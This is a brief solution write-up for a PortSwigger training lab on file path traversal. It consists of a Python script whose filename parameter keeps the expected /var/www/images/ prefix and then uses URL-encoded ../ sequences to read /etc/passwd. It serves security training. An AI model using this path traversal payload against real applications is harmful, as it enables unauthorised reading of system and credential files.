# Lab: File path traversal, validation of start of path

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

Solution: 

```python
import requests

response = requests.get(
    'https://0a51004504a7e3b2c1aa2b25006e00b9.web-security-academy.net/image?filename=/var/www/images/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    verify=False,
)

print(response.text)
```